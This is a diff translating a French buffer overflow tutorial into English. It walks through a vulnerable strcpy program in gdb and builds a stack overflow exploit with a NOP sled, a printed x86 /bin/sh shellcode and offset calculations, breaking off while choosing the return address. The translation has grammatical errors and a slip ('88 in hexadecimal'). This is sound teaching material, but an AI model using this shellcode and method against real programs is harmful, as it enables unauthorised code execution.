@@ -4,67 +4,67 @@ date: 2015-03-04
 author: "Pixis"
 layout: post
 permalink: /buffer-overflow/
-disqus_identifier: 0000-0000-0000-000B
-description: "Nous allons ici expliquer ce qui se cache derrière la notion de buffer overflow, avant de donner deux exemples différents d'exploitation dans ce tuto"
+disqus_identifier: 1000-0000-0000-000B
+description: "In this article we are going to explain what a buffer overflow his. We will then give two exploitation examples in this "buffer overflow" tutorial"
 cover: assets/uploads/2015/03/groot.jpg
 tags:
   - "User Land"
   - Linux
 ---
 
-Nous allons ici expliquer ce qui se cache derrière la notion de buffer overflow, avant de donner deux exemples différents d'exploitation dans ce tuto "buffer overflow":
+In this article we are going to explain what a buffer overflow his. We will then give two exploitation examples in this "buffer overflow" tutorial :
 
-  1. Cas d'un buffer qui alloue suffisamment d'espace pour contenir un shellcode avant l'adresse de retour sur la pile
-  2. Cas d'un buffer trop petit pour contenir un shellcode avant l'adresse de retour sur la pile
+  1. When the buffer is large enough to contain a shellcode before the stack return address
+  2. When the buffer is too small to contain a shellcode before the stack return address
 
 <!--more-->
 
-## Théorie
+## Theory
 
-Nous avons vu l'utilité de la pile (_stack_) dans les articles précédents. En fin d'article, nous avons évoqué le cas où une fonction avait besoin d'allouer de l'espace sur la pile pour une de ses variables locales, qui était un tableau
+We saw the stack utility in the previous articles. At the end, we talked about the case where a function needed to allocate space on the stack for a variable which was an array.
 
 ```c
-void maFonction(char *uneChaine) {
-    char tableau[24];
+void myFunction(char *aString) {
+    char array[24];
 }
 ```
 
-On obtenait alors le schéma suivant pour représenter la stack :
+We got the following schematic representing the stack :
 
 [![Stack](/assets/uploads/2015/03/stack1.png)](/assets/uploads/2015/03/stack1.png)
 
-Très bien. Maintenant, si nous allouons un tableau de caractères à cette variable locale de la manière suivante
+Very good. Now, if we allocate a char array to this local variable with the following :
 
 ```c
-void maFonction(char *uneChaine) {
-    char tableau[24];
-    strcpy(tableau, uneChaine);
+void myFunction(char *aString) {
+    char array[24];
+    strcpy(array, aString);
 }
 ```
 
-Alors `uneChaine` sera copié dans la pile dans l'espace alloué, et ce en partant de l'adresse pointée par `ESP` puis en descendant dans la pile (donc des adresses basses vers les adresses hautes, ou encore du haut de la pile vers le bas de la pile). Prenons un exemple d'une chaine remplie de `"A"` d'une longueur inférieure à 24 octets :
+Then `aString` will be paste in the allocated space in the stack, starting from the address pointed by `ESP` then going down in the stack (so from low addresses to high addresses, or form the top of the stack to the bottom of it). We will take the example of a String full of `"A"` which length is shorter than 24 bytes :
 
 [![Stack](/assets/uploads/2015/03/stack2.png)](/assets/uploads/2015/03/stack2.png)
 
-Tout va bien, mais vous vous dites sûrement : Hey, mais si je mets plus de caractères que prévu, il se passe quoi ?
+Everything is fine, but you are probably asking yourself : Hey, but what if I put more char than the limit ?
 
 [![Stack](/assets/uploads/2015/03/stack3.png)](/assets/uploads/2015/03/stack3.png)
 
-C'est le drame... pour le développeur. Mais pour nous, c'est maintenant que nous allons commencer à nous amuser ! Vous avez deviné comment ?
+What a shame... for the developer. But for us, this is where the fun begins ! Did you find out how ?
 
-Oui, on a pu écrire sur la valeur de retour que le processeur récupèrera à la fin de la fonction. Dans l'état actuel, à la fin du programme, il va tenter d'aller à l'adresse `AAAA` qui, en hexadécimal, est `0x41414141`. Il y a de fortes chances pour qu'il n'ait pas le droit d'accéder à cette case mémoire, ou que cette zone mémoire ne soit pas mappée, et vous obtiendrez un joli `SEGFAULT`.
+We manage to write on the return value that the CPU retrieves at the end of the function. In the current state, he will try to go to the `AAAA` address which we write `0x41414141` in hexadecimal. There is a high probability that he does not have the right to access this memory address, or that this memory section is not mapped, and you will probably get a beautiful `SEGFAULT`.
 
-Mais cela veut dire que l'on peut écrire la valeur que l'on veut, donc on peut rediriger le fil d'exécution du programme vers un morceau de code que nous aurons préparé. Ce morceau de code peut par exemple ouvrir un shell.
+But that means that we can write any value. We could redirect the execution flow of this program to a piece of code that we wrote. This piece of code could open a shell for example.
 
-Alors, à vos claviers, et exploitons ceci...
+So get you keyboards ready, let's exploit this...
 
-## Pratique
+## Practice
 
-Comme promis, nous allons nous intéresser à deux cas pratiques.
+As promised, we will see two different cases.
 
-### Cas 1
+### Case 1
 
-J'ai illustré un cas similaire en vidéo, vous le [trouverez ici](https://www.youtube.com/watch?v=V7Gdc32XRhA){:target="blank"}.
+I made a video with a similar case. You can [find it here](https://www.youtube.com/watch?v=V7Gdc32XRhA){:target="blank"}. (The video is in french).
 
 ```c
 #include <stdio.h>
@@ -86,32 +86,32 @@ int main(int argc, char *argv[])
 }
 ```
 
-Voici un programme qui prend en entrée un argument (qui sera une string, ou plus précisément un tableau de caractères). Cet argument est passé tel quel à la fonction `func`. La fonction `func` prévoit alors de la place sur la pile en allouant 64 octets. Cet espace est pointé par le pointeur `buffer`. Puis le programme copie le contenu de la chaine de caractère dans ce `buffer`, sans aucune vérification sur la taille, et enfin affiche le contenu de `buffer`.
+Here we have a program which takes an argument to run (which will be a string, or more precisely an array of chars). The argument is passed to the `func` function. This function then allocated 64 bytes on the stack. This memory space is pointed at by the `buffer` pointer. The program then copy the content of our string in this `buffer`, without any verification on the size of the string, and finally display our `buffer` content.
 
-Très bien compilons-le et testons le :
+Great ! Let's compile and run it :
 
 ```bash
 hackndo@hackndo:~$ gcc binary.c -o binary
-  
+
 hackndo@hackndo:~$ ./binary AAA
-  
+
 AAA
-  
+
 hackndo@hackndo:~$ ./binary $(perl -e 'print "A"x200')
-  
+
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-  
-Erreur de segmentation
-  
-hackndo@hackndo:~$ 
+
+Segmentation fault
+
+hackndo@hackndo:~$
 ```
 
-Après compilation, nous avons donc lancé notre programme en lui passant dans un premier temps la chaine de caractères `AAA`. Le programme nous l'a affichée à l'écran, comme prévu. Dans le second cas, nous avons envoyé 200 fois la lettre `"A"`. Le programme nous l'affiche également, mais nous nous retrouvons face à une erreur de segmentation (ou `SEGFAULT`). Cela veut dire que nous avons tenté de lire un segment nous n'avions pas le droit de lire (ou écrire quelque part où nous n'avions pas le droit d'écrire).
+After the compilation, we firstly run our program with the string `AAA` as the parameter. It is then display to us correctly as expected. In the second case, we sent the letter `"A"` 200 times. Our program also displays it but we got a segmentation fault (`SEGFAULT`). This means that we tried to read a memory segment where we didn't had the right to read (or write where we didn't had the right to write).
 
-Tentons de comprendre pourquoi, en suivant pas à pas le fonctionnement du programme lors de son exécution. Voici les instructions assembleur des deux fonctions
+Let's try to understand what's going on. We are going to follow step by step how our program is running. There are the assembly instructions of both functions :
 
 ```bash
-# Fonction main
+# Function main
 (gdb) disass main
 Dump of assembler code for function main:
 0x08048419 <+0>:     push   ebp
@@ -127,13 +127,13 @@ Dump of assembler code for function main:
 0x08048439 <+32>:    add    eax,0x4
 0x0804843c <+35>:    mov    eax,DWORD PTR [eax]
 0x0804843e <+37>:    mov    DWORD PTR [esp],eax
-0x08048441 <+40>:    call   0x80483f4 
+0x08048441 <+40>:    call   0x80483f4
 0x08048446 <+45>:    mov    eax,0x0
 0x0804844b <+50>:    leave
 0x0804844c <+51>:    ret
 End of assembler dump.
 
-# Fonction func
+# Function func
 (gdb) disass func
 Dump of assembler code for function func:
 0x080483f4 <+0>:     push   ebp
@@ -152,32 +152,32 @@ Dump of assembler code for function func:
 End of assembler dump.
 ```
 
-La première partie de ce code correspond à la fonction `main` et la deuxième partie correspond à la fonction `func`. L'appel de la fonction `func` se fait à l'instruction située à l'adresse `0x08048441` de la fonction `main`. Lorsque nous rentrons dans `func`, la troisième ligne correspond à l'allocation du buffer. `0x58` (88 en décimal) octets sont alloués (ce qui est plus que les 64 octets que nous demandons dans le code car il faut tenir compte de l'alignement des variables en mémoire. C'est un sujet dont nous ne discuterons pas ici, il ferait l'objet d'un article complet).
+The first part of this code is our `main` function and the second part is our `func` function. The call to the `func` function is done at the `0x08048441` address of the `main` function. As we enter in `func`, the third line is our buffer allocation. `0x58` (88 in hexadecimal) bytes are allocated (you probably noticed that it is more than the 64 bytes we asked in our code because the alignment of the variables in memory must be taken into account. That's a subject we won't discuss here, it would be the subject of a full article.).
 
-Ensuite, à l'adresse `0x08048407` se trouve l'appel système pour copier le contenu de la variable dans le buffer. L'instruction à l'adresse `0x08048412` fait l'appel à `puts` qui permet d'afficher un tableau de caractère sur la sortie standard, et enfin nous avons l'instruction de retour à l'adresse `0x08048418`.
+Next, at `0x08048407` address is the system call to copy the variable's content into the buffer. The `0x08048412` instruction calls `puts` which allow to display a char array to the standard output. We finally have the return instruction at the `0x08048418` address.
 
-Pour pouvoir suivre l'exécution du code, nous allons placer des breakpoints à des endroits stratégiques pour que je puisse vous faire comprendre le fonctionnement. Vous comprendrez pourquoi ces endroits sont intéressants, puisqu'à chaque breakpoint je vous expliquerai son apport
+In order to be able to follow the execution of the code, we will place breakpoints in strategic places so that I can make you understand how it works. You'll understand why these places are interesting, because at each breakpoints I'll explain its contribution to the code.
 
 ```bash
-(gdb) break *0x08048441 # Avant func, dans main
+(gdb) break *0x08048441 # Before func, in main
 Breakpoint 1 at 0x8048441
-(gdb) break *0x080483f7 # Avant réservation mémoire pour le buffer
+(gdb) break *0x080483f7 # Before memory allocation for the buffer
 Breakpoint 2 at 0x80483f7
-(gdb) break *0x080483fa # Après réservation mémoire pour le buffer
+(gdb) break *0x080483fa # After memory allocation for the buffer
 Breakpoint 3 at 0x80483fa
-(gdb) break *0x0804840c # Après copie de la variale dans le buffer
+(gdb) break *0x0804840c # After copying the variable in the buffer
 Breakpoint 4 at 0x804840c
-(gdb) break *0x08048418 # Avant la sortie de la fonction
+(gdb) break *0x08048418 # Before returning from the function
 Breakpoint 5 at 0x8048418
 ```
 
-* Le **premier** breakpoint est placé juste avant l'appel de la fonction `func` dans `main`. Nous pourrons ainsi regarder comment est fait cet appel notamment comment est empilée l'argument que nous passons au programme.
-* Le **deuxième** est placé avant la réservation de la mémoire pour le buffer. Nous verrons ici comment la fonction `func` prépare son stackframe en enregistrant l'ancienne valeur de EBP, et en l'initialisant pour son propre stackframe.
-* Le **troisème** est placé juste après cette réservation de mémoire, afin de voir comment le processeur réserve de l'espace mémoire pour le buffer.
-* Le **quatrième** est placé après avoir copié la variable dans le buffer, permettant d'observer comment le buffer se rempli avec l'argument que nous lui avons passé, suite à la fonction strcpy.
-* Le **cinquième** est placé avant de sortir de la fonction, pour qu'on puisse voir que le printf n'a pas de problème pour afficher la chaine de caractères.
+* The **first** breakpoint is placed just before the `func` call in `main`. We could see how this call is done, in particular how the argument we are passing on to the program is stacked up.
+* The **second** one is placed before the memory allocation into the buffer. Here, we will see how the `func` function is preparing it stackframe by recording the old EBP value, and by initializing it for it's own stackframe.
+* The **third** is placed just after this memory allocation in order to see how the processor reserves memory space for the buffer.
+* The **fourth** is placed after copying the variable into the buffer, thus allowing us to observe how the buffer is filling up with the argument that we passed to him, with the `strcpy` function.
+* The **fifth** is placed before exiting the function so we can see that the printf don't have any problem displaying our string.
 
-C'est parti, il est temps d'exécuter le code. Pour cela, je vais envoyer un argument de longueur 78. Il y a une bonne raison, et vous allez la comprendre au fil de cet exemple.
+Let's go, it's time for us to execute this code. For this, I will send an argument of length 78. There is a good reason, and you will understand it in the course of this example.
 
 ```bash
 (gdb) run `perl -e 'print "A"x78'`
@@ -199,38 +199,38 @@ Dump of assembler code for function main:
    0x08048439 <+32>:    add    eax,0x4
    0x0804843c <+35>:    mov    eax,DWORD PTR [eax]
    0x0804843e <+37>:    mov    DWORD PTR [esp],eax
-=> 0x08048441 <+40>:    call   0x80483f4 
+=> 0x08048441 <+40>:    call   0x80483f4
    0x08048446 <+45>:    mov    eax,0x0
    0x0804844b <+50>:    leave
    0x0804844c <+51>:    ret
 End of assembler dump.
 
-# On affiche l'état des trois registres
+# We display the state of the three registers
 (gdb) i r $eip $esp $ebp
 eip            0x8048441     0x8048441 <main+40>
 esp            0xbffffc50    0xbffffc50
 ebp            0xbffffc68    0xbffffc68
 
-# On examine la valeur contenue par ESP
+# We examine the value contained by ESP
 (gdb) x/xw $esp
 0xbffffc50:    0xbffffe35
 
-# On examine le contenu de ESP
+# We're looking at the content of ESP
 (gdb) x/s 0xbffffe35
 0xbffffe35:     'A'
 ```
 
-Très bien, nous voyons où nous en sommes grâce à la commande `disass main`. Nous sommes donc juste avant l'appel que `main` fait à `func`. Donc en toute logique, l'élément qui est sur le dessus de la pile devrait être le pointeur vers la chaine de caractère que nous avons passée en argument.
+Great, we can see where we are in the execution flow thanks to the `disass main` command. We are just before the call to `func`. So logically, the element at the top of the stack should be the pointer to the character string that we passed in argument.
 
-En affichant les différents registres qui nous intéressent par la commande abrégée `info registers`, nous pouvons voir que le sommet de la pile se trouve à l'adresse pointée par `ESP`, c'est à dire `0xbffffc50`.
+By displaying the different registers that we are interested in with the abbreviated command `info registers`, we can see that the top of the stack is located at the address pointed by `ESP`, that is `0xbffffc50`.
 
-Si nous regardons l'adresse qui est ici, avec la commande `x/xw $esp`, nous obtenons l'adresse qui pointe vers notre chaine de caractères, `0xbffffe35`. Et effectivement, lorsqu'on affiche la String située à cette adresse mémoire, gdb nous renvoie que c'est une répétition de 78 fois le caractère `"A"`.
+If we look at the address here, with the command `x/xw $esp`, we get the address that point to our string, `0xbffffe35`. Indeed if we  display the String located at the memory address, gdb returns that it is a repetition of 78 times the character `"A"`.
 
-Ayant placé le breakpoint sur l'instruction à l'adresse `0x08048441`, elle n'a pas encore été exécutée, mais ça sera la prochaine, ce qui explique pourquoi `EIP` a pour valeur cette adresse.
+Having placed the breakpoint on the instruction at the `0x08048441` address, it has not been executed, but it will be the next one, that explain why `EIP` have this address as value.
 
-Enfin, nous voyons que le début du stackframe de la fonction `main` est situé à l'adresse contenue dans `EBP`, c'est à dire `0xbffffc68`.
+Finally, we can see that the start of the `main` function stackframe is located at the address within `EBP`, i.e. `0xbffffc68`.
 
-Ok, tout est bon, on passe à la suite !
+Ok, everything is looking good, let's move on !
 
 ```bash
 (gdb) continue
@@ -263,15 +263,15 @@ ebp            0xbffffc48    0xbffffc48
 0xbffffc48:    0xbffffc68    0x08048446    0xbffffe35    0xb7ff1380
 ```
 
-Encore une fois, nous pouvons voir où nous en sommes dans l'exécution du programme. Si vous suivez, vous devriez deviner ce qu'il y a au sommet de la pile, et le rôle de la prochaine instruction à être exécutée.
+One more times, we can see where we are in the execution flow of our program. If you are still following, you should be able to guess what's at the top of the stack, and the purpose of the next instruction to be executed.
 
-Comme nous sommes entrés dans la fonction, le processeur a enregistré le registre `EIP` qui étaient en cours au moment de l'appel, c'est à dire l'adresse `0x08048446`.
+As we entered the function, the processor already recorded the `EIP` register that was running at the time of the call, i.e. the address `0x08048446`.
 
-Ensuite, le début de la fonction voulant avoir son propre stack frame enregistre le début du stack frame de la fonction appelante, à l'aide de l'instruction `push ebp` puis il initialise le début de son stack frame en copiant la valeur de `ESP` dans `EBP` (`mov ebp,esp`).
+Then, the beginning of the function wanting to have his own stackframe record the beginning of the stackframe of the calling function with the `push ebp` instruction. It then initialize the beginning of his own stackframe by copying the value of `ESP` into `EBP` (`mov ebp,esp`).
 
-J'ai affiché les valeurs des trois registres, et lorsqu'on affiche les 4 valeurs qui sont au sommet de la stack, on retrouve sans surprise la dernière valeur ajoutée qui est l'ancienne valeur de `EBP` (que nous avions trouvée avant l'appel de la fonction, c'était la base du stack frame de la fonction `main`), suivie de la sauvegarde de `EIP`, adresse de l'instruction qui suit le `call` vers la fonction `func`.
+I displayed the three registers values, and when we are displaying the 4 values that are on top of the stack, we find unsurprisingly the last value added which is the previous value of `EBP` (that we found before the function call, that was the stackframe base of the `main` function), followed by the save of `EIP`, instruction address that follows the `call` to the `func` function.
 
-À la suite !
+Let's continue !
 
 ```bash
 (gdb) continue
@@ -301,29 +301,29 @@ esp            0xbffffbf0    0xbffffbf0
 ebp            0xbffffc48    0xbffffc48
 ```
 
-Nous n'avons avancé que d'une instruction, mais elle est très importante. C'est cette instruction qui alloue l'espace requis pour le buffer, ainsi que pour les variables qu'il aura besoin d'ajouter à la pile, telle que l'adresse de notre chaine de caractère qui va être passée à l'appel système `strcpy`. L'instruction assembleur retire `0x58` (soit 88) octets à l'adresse contenue dans `ESP`. En d'autres termes, elle décale le sommet de la pile et la fait grossir de 88 octets.
+We have advanced only one instruction, but it's a really important one. It's this instruction that allocate the memory space required by the buffer, as well as for the variables that it will need to add to the stack, such as the address of our string that will be passed at the `strcpy` system call. The assembly instruction remove `0x58` (88) bytes at the address contained in `ESP`. In other words, it shift the top of the stack and make it grow by 88 bytes.
 
-À la ligne `+6`,
+At the line `+6`,
 
 ```text
 => 0x080483fa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
 ```
 
-l'instruction cherche l'adresse qui est à l'adresse `EBP+8`, puis assigne le contenu pointé par cette adresse à `EAX`. Nous savons que `EBP` pointe sur la base du stack frame de la fonction. Donc `EBP+4` est la sauvegarde de `EIP`, et `EBP+8` est l'adresse du pointeur sur notre chaine de caractère. Donc `EAX` va contenir l'adresse de notre chaine de caractère.
+The instruction is looking for the memory address which is at the `EBP+8` address, then assign the content pointed by this address to `EAX`. We know the `EBP` is pointing at the stackframe base of the function. So `EBP+4` is the backup of `EIP`, and `EBP+8` is the address of the pointer on our character string. So `EAX` will contain the address of our string,
 
-La ligne suivante, `+9`, copie le contenu de `EAX` (donc l'adresse de notre chaine de caractère), dans `ESP+4`, c'est à dire dans la case mémoire juste avant le sommet de la pile.
+The next line, `+9`, copy the content of `EAX` (so the address of our string), into `ESP+4`, that is in the memory case just before the top of the stack.
 
-Enfin, les instructions aux lignes `+13` et `+16` mettent sur le sommet de la pile l'adresse du début de buffer, qui se trouve à `EBP - 0x48`. Le buffer qui sera alloué a alors une taille de `EBP - (EBP - 0x48) = 0x48` octets (donc 72 octets)
+Finally, the instructions on lines `+13` and `+16` put the address of the beginning of the buffer on top of the stack, which is at `EBP - 0x48`. The buffer that will be allocated then have a size of `EBP - (EBP - 0x48) = 0x48` bytes (meaning 72 bytes).
 
-Ce qu'il y a des ces 72 octets n'a pas d'importance puisqu'ils ne seront pas lus tant que le buffer n'aura pas été rempli par un contenu.
+It doesn't matter what those 72 bytes are since they won't be read until the buffer is filled with content.
 
-Vous avez suivi ? Allez, comme je suis sympa, je me suis fendu d'un beau schéma pour comprendre l'état de la pile juste avant d'appeler `strcpy` pour résumer l'état actuel.
+Did you follow? Come on, how nice of me, I made a nice diagram to understand the state of the stack just before calling `strcpy` to summarize the current state.
 
 [![Stack](/assets/uploads/2015/03/stack4.png)](/assets/uploads/2015/03/stack4.png)
 
-C'est un peu plus clair ? Essayez de reprendre mes explications avec ce schéma en tête, ça sera surement plus facile de revenir une deuxième fois dessus.
+Is that a little clearer? Try to resume my explanations with this diagram in mind, it will surely be easier to come back to it a second time.
 
-Un peu de mathématiques font que nous avons finalement un décalage total de 88 octets, ce qui signifie qu'il y un décalage de 22 `quadri-octets` appelés `dword` (taille d'une adresse). Donc si nous avons un décalage de 22 `dwords`, et que nous affichons les 24 premiers éléments de la pile, nous devrions retomber sur nos pattes et trouver en dernières positions notre sauvegarde de `EBP` et `EIP`.
+A bit of mathematics shows that we finally have an offset of 88 bytes, which means that there is an offset of 22 `quadri-bytes` called `dword` (the size of an address). So if we have an offset of 22 `dwords`, and we are showing the first 24 items in the stack, we should fall back on our feet and find our backup of `EBP` and `EIP` in the last positions.
 
 ```bash
 (gdb) x/24xw $esp
@@ -337,7 +337,7 @@ Un peu de mathématiques font que nous avons finalement un décalage total de 88
 #                                              sEBP          sEIP
 ```
 
-Et c'est le cas ! La fin de la dernière ligne contient bien les deux adresses escomptées `sEBP` et `sEIP`. Les 72 octets qui précèdent sont prévus pour le buffer, et les 16 premiers pour l'appel à `strcpy`.
+And that is the case ! The end of the last line, indeed, contain both addresses `sEBP` and `sEIP`. The above 72 bytes are for the buffer, and the first 16 bytes are for the call to `strcpy`.
 
 ```bash
 (gdb) c
@@ -375,16 +375,16 @@ ebp            0xbffffc48    0xbffffc48
 0xbffffc30:    0x41414141    0x41414141    0x41414141    0x41414141
 0xbffffc40:    0x41414141    0x41414141    0x41414141    0x08004141
 #                                            ^^^^^^^^      ^^^^^^^^
-#                                          EBP écrasé    EIP écrasé
+#                                       overwritten EBP  overwritten EIP
 ```
 
-Nous continuons donc, et nous breakons sur l'instruction qui suit l'appel système `strcpy`, qui copie le contenu de la variable que nous avons passée en argument (les `"A"`) dans le buffer.
+So we continue, and break on the instruction that follows the system call `strcpy`, which copies the content of the variable that we passed as an argument (the `A`'s) into the buffer.
 
-Comme on le voit sur la pile, les deux premiers éléments sont les deux paramètres que nous avons passés à strcpy. `0xbffffc00` est l'adresse de début de buffer, qui est bien le commencement des `0x41`, et le deuxième est l'adresse de notre chaine de caractère en mémoire, comme nous l'avons vu au début.
+As we can see on the stack, the first two elements are both parameters that we passed to strcpy. `0xbffffc00` is the start address of the buffer, which is indeed the beginning of the `0x41`'s, the second one is the address of our char string in memory, as we saw at the beginning.
 
-Mais rappelez-vous, nous n'avions prévu qu'un buffer de 64 octets, et nous lui en avons passés 78 ! Il risque d'y avoir problème. On examine alors le haut de la pile comme au breakpoint précédent, et nous remarquons que tout l'espace alloué pour le buffer a été rempli... et qu'il a même débordé ! La sauvegarde de `EBP` a été écrasée par nos `"A"` (représenté par leur valeur `0x41` ASCII), et notre enregistrement de `EIP`, appelé ici `sEIP` a été partiellement réécrit. Il est devenu `0x08004141`. Comme la notation est en Little Endian, les cases mémoire sont en fait : `0x41` `0x41` `0x00` `0x08`. Donc nous avons les deux derniers `"A"` de notre variable, suivit de l'octet nul qui marque la fin d'une chaine de caractère.
+But remember, we only planned a 64 bytes buffer, and we gave him 78 ! That could be a problem. So we check the top of the stack like at the previous breakpoint, and we notice that all the space allocated to the buffer has been filled... and it has even **overflowed** ! The save of `EBP` as been overwritten by our `"A"`'s (represented by their ASCII value `0x41`), and our `EIP` record, here called `sEIP` has been partially rewritten. It became `0x08004141`. Since the notation is in Little Endian, memory cases are in fact : `0x41` `0x41` `0x00` `0x08`. So we have last two `"A"`'s of our variable, followed by the null byte which marks the end of a string.
 
-Si ce débordement de buffer (buffer overflow) ne dérange pas le processeur dans l'immédiat, il va se trouver embêter lorsqu'il devra réutiliser la valeur sauvegardée de `EIP` pour pouvoir reprendre le cours de son exécution.
+If this buffer overflow does not disturb the CPU for the moment, it will be annoyed when it has to use the saved value of `EIP` in order to resume execution.
 
 ```bash
 (gdb) continue
@@ -400,43 +400,41 @@ Program received signal SIGSEGV, Segmentation fault.
 
 ```
 
-Et voilà. Le processeur a bien voulu afficher la chaine dans son intégralité en s'arrêtant au caractère nul, mais lorsqu'il a voulu réutiliser la version sauvegardée de `EIP`, il est tombé sur l'adresse `0x08004141`. Et malheureusement, il n'a pas le droit d'accéder à cette adresse mémoire. Le `SEGFAULT` est inévitable !
+There we go. The processor succeed to display the entire string, stopping at the null byte, but when it wanted to reuse the saved version of `EIP`, it came across the address `0x08004141`. And unfortunately, it is not allowed to access this memory address. The `SEGFAULT` is inevitable !
 
-Comme nous l'avons dit dans la partie théorique, nous pouvons réécrire la valeur enregistrée de `EIP` pour pouvoir rediriger le fil d'exécution du programme. Mais où rediriger cette exécution ? Et bien vers le début d'un shellcode. Un shellcode est une chaine de caractères qui représente une suite d'instructions machine qui, en s'exécutant, ouvrira un shell. (Le terme shellcode est devenu un peu plus générique, puisque qu'il désigne maintenant n'importe quelle chaine d'instruction machine)
+As we said in the theoretical part, we can rewrite the value stored in `EIP` in order to redirect our program execution flow. But where to redirect this execution ? Well why not at the beginning of a shellcode ? A shellcode is a string of characters that represents a sequence of machine instructions that, when executed, will open a shell (The term shellcode has become a little more generic, since it now refers to any string of machine instructions).
 
-Nous pourrions décrire ici comment écrire un shellcode, mais ce n'est pas le but de cet article. Des notions plus avancées d'assembleur sont nécessaires et si nous voulions faire le tour du sujet, un article ne suffirait pas. C'est pourquoi nous allons prendre un shellcode tout fait, disponible sur internet, fonctionnant pour une architecture x86 :
+We could describe here how to write a shellcode, but that is not the purpose of this article. More advanced notions of assembler are needed and if we wanted to cover every aspect of this subject, an article would not be enough. That's why we will take a ready-made shellcode, available on the internet, working on an x86 architecture :
 
-```
-\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
-```
+> \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
 
-Rapidement, cette suite d'instruction exécute l'appel système `execve` en lui passant comme argument la chaine de caractères `"/bin/sh"`, puis fait un appel à l'appel système `exit`.
+Simply put, this instruction sequence executes the `execve` system call, passing the string `"/bin/sh"` as an argument, and then makes a call to the `exit` system call.
 
-Il s'agit donc de faire exécuter cette suite d'instructions au programme. Le nombre d'octets nécessaires pour stocker cette suite est de 45 octets (38 caractères sous la forme \x?? et les 7 caractères imprimables `/`, `b`, `i`, `n`, `/`, `s`, `h`.
+This sequence of instruction must therefore be executed by the program. The number of bytes necessary to store this sequence is 45 bytes (38 characters in the form \x?? and the 7 printable characters `/`, `b`, `i`, `n`, `/`, `s`, `h`.)
 
-Et voici comment placer tout cela :
+And here's how to put it all :
 
 [![img_54f78559832ab](/assets/uploads/2015/03/img_54f78559832ab.png)](/assets/uploads/2015/03/img_54f78559832ab.png)
 
-Nous avons ici une représentation horizontale de la pile. À gauche, nous avons le sommet de la pile, et plus nous allons à droite, plus nous descendons dans la pile. Lorsque `strcpy` écrit dans le buffer, il écrit de gauche à droite, jusqu'à remplacer la sauvegarde de `EBP` puis de `EIP`.
+Here we have a horizontal representation of the stack. On the left, we have the top of the stack, and the more we go to the right, the more we are going down in the stack. When `strcpy` writes in the buffer, it writes from the left to the right, until overwriting the saves `EBP` and then `EIP`.
 
-  * Il s'agit alors de remplir une **première partie** du buffer avec l'instruction `\x90`. En assembleur, cette instruction veut dire **ne fait rien avec moi, passe à l'instruction suivante**. C'est l'instruction `NOP` (No OPeration).
-  * La **seconde partie** du buffer contient le shellcode, que nous voulons que le programme exécute.
-  * La **troisième partie** contient l'adresse que l'on contrôle.
+  * Then fill the **first part** of the buffer with the `\x90` instruction. In assembly, this instruction means **don't do anything with me, just go to the next instruction** This is the `NOP` (No OPeration).
+  * The **second part** of the buffer contains the shellcode, which we wants the program to execute.
+  * The **third part** contains the address that we control.
 
-Nous allons alors faire en sorte que le programme tombe dans la première partie, le pool de `NOP`. En effet, si on tombe au milieu des NOP, alors le programme va aller à l'instruction suivante, qui est un NOP, puis la suivante etc. jusqu'à arriver au début du shellcode, et va l'exécuter dans son intégralité. C'est seulement une manière de rendre l'exécution plus souple, puisque n'importe quelle adresse dans les `NOP` convient.
+We will make the program drop in the first part, the `NOP` pool. Indeed, if we fall in the middle of the NOPs, then the program will go to the next instruction, which is a NOP, and so on until it reaches the shellcode, and will execute it in its entirety. It is only a way to make the execution of the shell code simpler, since any address in the NOPs will do.
 
-Pour connaitre le nombre de `NOP` possible, il faut faire un petit calcul :
+To find out how many `NOPs` are possible , we have to do a little calculation :
 
-Nous avons vu précédemment que la taille du buffer alloué pour `strcpy` était de 72 octets. Mais pour écraser la sauvegarde de `EIP`, nous devons d'abord écraser la sauvegarde de EBP, donc 4 octets de plus, ce qui font 76 octets.
+We saw earlier that the buffer size allocated by `strcpy` was 72 bytes. But in order to overwrite the `EIP` save, we must first overwrite the save of `EBP`, so 4 more bytes, which is 76 bytes.
 
-Cela veut dire que si on écrit 76 octets, alors on aura tout écrasé jusqu'à `EIP`, `EIP` non inclus.
+This means that if we write 76 bytes, then we will have overwritten everything up to `EIP`, `EIP` not included.
 
-Si on en écrit deux de plus (78, comme dans l'exemple), alors deux octets de EIP seront écrasés (enfin 3, si on prend le caractère nul de fin de chaine). J'avais fait ce travail en amont pour l'exemple, c'est pourquoi j'avais choisi 78 octets !
+If we write two more bytes (78, as in the example), then two bytes of EIP will be overwritten (more like 3, if we take the null character at the end of the string). I had done this upstream for the example, that's why I had chosen 78 bytes !
 
-Ces caractères doivent se finir par le shellcode (ce n'est pas obligatoire, mais c'est le plus pratique !). Or nous avons dit que le shellcode comptait 45 octets. Ainsi, nous devons insérer 76 - 45 = 31 `NOP`, donc 31 fois la valeur `\x90`.
+These characters must end with the shellcode (it's not mandatory, but it's the most convenient!). But we said that the shellcode was 45 bytes long. So we have to insert 76 - 45 = 31 `NOP`, meaning 31 times the value `\x90`.
 
-Enfin, pour trouver l'adresse qui écrasera la sauvegarde de EIP, rappelons-nous l'état de la stack :
+Finally, to find the address that will overwrite the EIP backup, let's remember the state of the stack :
 
 ```bash
 (gdb) x/24xw $esp
@@ -448,21 +446,21 @@ Enfin, pour trouver l'adresse qui écrasera la sauvegarde de EIP, rappelons-nous
 0xbffffc40:    0x41414141    0x41414141    0x41414141    0x08004141
 ```
 
-Les NOPS seront donc entre l'adresse `0xbffffc00` et `0xbffffc00 + 31 = 0xbffffc1f`. Pour être sûr de tomber dedans, prenons l'adresse `0xbffffc10`
